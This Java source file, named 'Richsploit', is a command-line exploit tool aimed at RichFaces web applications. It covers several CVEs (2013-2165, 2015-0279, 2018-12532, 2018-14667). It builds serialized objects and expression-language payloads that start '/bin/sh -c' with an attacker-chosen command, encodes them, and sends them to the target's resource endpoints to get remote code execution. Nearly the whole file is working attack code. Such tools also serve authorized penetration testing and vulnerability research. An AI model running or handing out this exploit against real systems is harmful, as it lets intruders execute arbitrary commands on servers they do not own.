package com.redtimmy;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.ArrayIndexOutOfBoundsException;
import java.net.URL;
import java.net.Proxy;
import java.net.InetSocketAddress;
import java.net.HttpURLConnection;
import java.net.ConnectException;

import org.ajax4jsf.resource.UserResource.UriData;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.el.MethodExpressionImpl;
import org.apache.el.ValueExpressionImpl;
import org.apache.el.lang.VariableMapperImpl;
import org.richfaces.resource.ResourceUtils;

import javax.el.MethodExpression;
import javax.el.ValueExpression;
import javax.faces.component.StateHolderSaver;
import javax.faces.view.Location;

import org.jboss.weld.el.WeldMethodExpression;

import com.sun.faces.facelets.tag.TagAttributeImpl;
import com.sun.faces.facelets.el.TagMethodExpression;


public class Richsploit {

	private static boolean DEBUG = false;

	public static void main(String[] args) {
		Options options = new Options();

        Option url = new Option("u", "url", true, "URL of richfaces application, i.e. http://example.com/app for RF4.x and http://example.com/app/a4j/g/3_3_3.Final for RF3.x");
        url.setRequired(true);
        options.addOption(url);

        Option version = new Option("v", "version", true, "Richfaces branch, either 3 or 4");
        version.setRequired(true);
        options.addOption(version);
        
        Option exploit = new Option("e", "exploit", true, "0: CVE-2013-2165\n 1: CVE-2015-0279\n2: CVE-2018-12532\n3: CVE-2018-12533\n4: CVE-2018-14667");
        exploit.setRequired(true);
        options.addOption(exploit);
        
        Option payload = new Option("p", "payload", true, "The file containing serialized object (CVE-2013-2165), or\nShell command to execute (all other CVE's)");
        payload.setRequired(true);
        options.addOption(payload);

        Option proxy = new Option("x", "proxy", true, "Use HTTP proxy (Format: HOST:PORT)");
        options.addOption(proxy);

        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine cmd = null;

        try {
            cmd = parser.parse(options, args);
        } catch (ParseException e) {
            System.out.println(e.getMessage());
            formatter.printHelp("Richsploit", options);

            System.exit(1);
        }

        String inputUrl = cmd.getOptionValue("url");
        String inputVersion = cmd.getOptionValue("version");
        String inputExploit = cmd.getOptionValue("exploit");
        String inputPayload = cmd.getOptionValue("payload");
        String inputProxy = cmd.getOptionValue("proxy");
        
        boolean proxyEnabled = cmd.hasOption("x");

        if(!(inputVersion.equals("3") || inputVersion.contentEquals("4"))) {
            printNegative("Version should be 3 or 4");
            System.exit(1);
        }
        
        int exploit_nr = Integer.parseInt(inputExploit);
        if(exploit_nr < 0 || exploit_nr > 4) {
            printNegative("Exploit should be 0, 1, 2, 3 or 4");
        }
        
        switch(exploit_nr) {
        case 0:
            if (proxyEnabled) {
                exploit0(inputUrl, inputVersion, inputPayload, inputProxy);
            } else {
                exploit0(inputUrl, inputVersion, inputPayload, "");
            }
            break;
        case 1:
            if (proxyEnabled) {
                exploit1(inputUrl, inputVersion, inputPayload, inputProxy);
            } else {
                exploit1(inputUrl, inputVersion, inputPayload, "");
            }
            break;
        case 2:
            if (proxyEnabled) {
                exploit2(inputUrl, inputVersion, inputPayload, inputProxy);
            } else {
                exploit2(inputUrl, inputVersion, inputPayload, "");
            }
        	break;
        case 3:
        	printNegative("CVE-2018-12533 is currently not supported");
        	break;
        case 4:
        	exploit4(inputUrl, inputVersion, inputPayload);
        	break;
        }

	}
	
	private static void exploit4(String inputUrl, String inputVersion, String inputPayload) {
		if(!inputVersion.equals("3")) {
			printNegative("This exploit only works for Richfaces 3.x");
			System.exit(1);
		}
		
		printInfo("This exploit requires that you first visit a page containing the <a4j:mediaOutput> tag. This will register UserResource for the session");

		
		UriData ud = new UriData();
		
		String command = inputPayload;
		String el = "#{\"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructors()[1]." +
				"newInstance(\"/bin/sh~-c~"+command+"\".split(\"~\")).start()}";
		
		MethodExpression me = new MethodExpressionImpl(el, null, null, null, null, null);
		StateHolderSaver shs = new StateHolderSaver(null, me);
		
		try {
			Field f = getField(ud.getClass(), "createContent");
			f.set(ud, shs);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		Object objectToSerialize = ud;
		
        ByteArrayOutputStream dataSteram = new ByteArrayOutputStream(1024);
        ObjectOutputStream objStream;
		try {
			objStream = new ObjectOutputStream(dataSteram);
	        objStream.writeObject(objectToSerialize);
	        objStream.flush();
	        objStream.close();
	        dataSteram.close();
			byte[] objectData = dataSteram.toByteArray();
	        byte[] dataArray = RichfacesDecoder.encrypt(objectData);
	        String encoded_payload = new String(dataArray, "ISO-8859-1");
			
	        StringBuilder url = new StringBuilder();
			url.append(inputUrl + "org.ajax4jsf.resource.UserResource/n/s/-1487394660/DATA/");
			printInfo("Sending request to " + url.toString() + "...");
			url.append(encoded_payload + ".jsf");
			
			printInfo("Copy the following URL in the browser to use the same session as you did when loading <a4j:mediaOutput>");
			System.out.println(url.toString());
		} catch (IOException e) {
			e.printStackTrace();
		}	
	}

	@SuppressWarnings("deprecation")
	private static void exploit2(String inputUrl, String inputVersion, String inputPayload, String inputProxy) {
		if(!inputVersion.equals("4")) {
			printNegative("This exploit only works for Richfaces 4.x");
			System.exit(1);
		}
		printInfo("Encoding payload");
		String command = inputPayload;
		String el_one = "#{\"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructors()[1].newInstance(\"/bin/sh~-c~" + command + "\".split(\"~\")).start()}";
		String el_two = "#{dummy.toString}";
		
		if(DEBUG) {
			System.out.println(el_one);
		}
		
		ValueExpression ve = new ValueExpressionImpl(el_one, null, null, null, null);
		VariableMapperImpl vmi = new VariableMapperImpl();
		vmi.setVariable("dummy", ve);
		MethodExpression me = new org.apache.el.MethodExpressionImpl(el_two, null, null, vmi, null, null);
		StateHolderSaver shs = createStateHolderSaver(me);

		Object[] dat = new Object[5];
        dat[0] = new Boolean(false);
        dat[1] = new String("image/jpeg");
        dat[2] = null;
        dat[3] = shs;
        dat[4] = null;
       
		String encoded_payload = ResourceUtils.encodeObjectData(dat);
		send_mor(inputUrl, encoded_payload, inputProxy);
	}

	@SuppressWarnings("deprecation")
	private static void exploit1(String inputUrl, String inputVersion, String inputPayload, String inputProxy) {
		if(!inputVersion.equals("4")) {
			printNegative("This exploit only works for Richfaces 4.x");
			System.exit(1);
		}
		
		printInfo("Encoding payload");
		String command = inputPayload;
		String myEl = "#{\"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructors()[1]." +
				"newInstance(\"/bin/sh~-c~"+command+"\".split(\"~\")).start()}";

		if(DEBUG) {
			System.out.println(myEl);
		}
		
		MethodExpression me = new org.apache.el.MethodExpressionImpl(myEl, null, null, null, null, null);
		StateHolderSaver shs = createStateHolderSaver(me);
		
		Object[] dat = new Object[5];
		dat[0] = new Boolean(false);
		dat[1] = new String("image/jpeg");
		dat[2] = null;
		dat[3] = shs;
		dat[4] = null;

		String encoded_payload = ResourceUtils.encodeObjectData(dat);
		send_mor(inputUrl, encoded_payload, inputProxy);
	}

	private static void exploit0(String inputUrl, String inputVersion, String inputPayload, String inputProxy) {
		printInfo("Encoding payload");
		String encoded_payload = RichfacesDecoder.encode(inputPayload);
		
		switch(inputVersion) {
		case "3":
			StringBuilder url = new StringBuilder();
			url.append(inputUrl + "org.richfaces.renderkit.html.images.BevelSeparatorImage/DATA/");
			printInfo("Sending request to " + url.toString() + "...");
			url.append(encoded_payload + ".jsf");
			send_request(url.toString(), inputProxy);
			break;
		case "4":
			send_mor(inputUrl, encoded_payload, inputProxy);
			break;
		}
	}
	
	private static StateHolderSaver createStateHolderSaver(MethodExpression me) {
		WeldMethodExpression wme = new WeldMethodExpression(me);
	    Location loc = new Location("",0,0);
	    TagAttributeImpl tai = new TagAttributeImpl(loc, "", "", "", "");
	    TagMethodExpression tme = new TagMethodExpression(tai, wme);
	    StateHolderSaver shs = new StateHolderSaver(null, tme);
	    return shs;
	}
	
	private static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
		Field field = clazz.getDeclaredField(fieldName);
		if (field != null)
			field.setAccessible(true);
		else if (clazz.getSuperclass() != null)
			field = getField(clazz.getSuperclass(), fieldName);
		return field;
	}
	

	private static void send_mor(String inputUrl, String encoded_payload, String inputProxy) {
		StringBuilder url = new StringBuilder();
		
		// Remove trailing slash
		if(inputUrl.endsWith("/")) {
			inputUrl = inputUrl.substring(0, inputUrl.length()-1);
		}
		
		url.append(inputUrl + "/rfRes/org.richfaces.resource.MediaOutputResource.jsf");
		printInfo("Sending request to " + url.toString() + "...");
		url.append("?do=" + encoded_payload);
		
		send_request(url.toString(), inputProxy);
	}

	private static void send_request(String url, String inputProxy) {
		if(DEBUG) {
			System.out.println(url);
		}
		try {
			if (inputProxy.isEmpty()) {
				URL url_connection = new URL(url);
				url_connection.openStream();
			} else {

				try {
					String[] proxy_settings = inputProxy.split(":");
					String proxy_addr = proxy_settings[0];
					Integer proxy_port = Integer.valueOf(proxy_settings[1]);

					Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxy_addr, proxy_port));
					URL target_url = new URL(url);
					HttpURLConnection connection = (HttpURLConnection) target_url.openConnection(proxy);
					connection.getInputStream();
				} catch (ArrayIndexOutOfBoundsException e) {
					printInfo("Failed to parse proxy address. Proxy should be given in HOST:PORT format.");
					System.exit(1);
				} catch (ConnectException e) {
					printInfo("Failed to connect to proxy. Ensure proxy is listening.");
					System.exit(1);
				}
			}
		} catch (IOException e) {
			if(e.getMessage().contains("Server returned HTTP response code: 500")) {
				printInfo("Server returned 500, payload might have been executed");
				return;
			} else {
				e.printStackTrace();
				System.exit(1);
			}
		}
		printInfo("Server returned 200 OK, payload might have been executed");
	}

	private static void printInfo(String string) {
		System.out.println("[+] "+string);
	}

	private static void printNegative(String string) {
		System.out.println("[-] "+string);
	}
}
